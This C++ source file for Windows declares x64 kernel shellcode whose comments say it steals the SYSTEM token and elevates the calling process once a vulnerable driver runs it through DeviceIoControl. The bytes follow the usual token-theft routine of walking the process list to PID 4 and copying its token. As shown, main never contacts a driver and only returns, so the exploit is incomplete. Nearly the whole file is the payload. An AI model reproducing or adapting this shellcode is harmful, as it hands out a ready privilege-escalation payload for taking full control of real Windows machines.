#include <windows.h>
#include <iostream>

// allocate the token stealing shellcode in user-mode and pass a pointer to it to the driver via DeviceIoControl
// the driver will execute the shellcode in kernel-mode and evelate the current (user-mode) process to SYSTEM

int main(){
 
  char shellcodePayload[] =

		"\x65\x48\x8B\x14\x25\x88\x01\x00\x00"  
		"\x4C\x8B\x82\xB8\x00\x00\x00"      
		"\x4D\x8B\x88\xf0\x02\x00\x00"            
		"\x49\x8B\x09"                            
		"\x48\x8B\x51\xF8"                    
		"\x48\x83\xFA\x04"                        
		"\x74\x05"                           
		"\x48\x8B\x09"                              
		"\xEB\xF1"                              
		"\x48\x8B\x41\x68"                     
		"\x24\xF0"                                  
		"\x49\x89\x80\x58\x03\x00\x00"            
		"\x48\x83\xC4\x40"                     
		"\x48\x31\xF6"                           
		"\x48\x31\xC0"                     
		"\xc3";
  
  return 0;
}
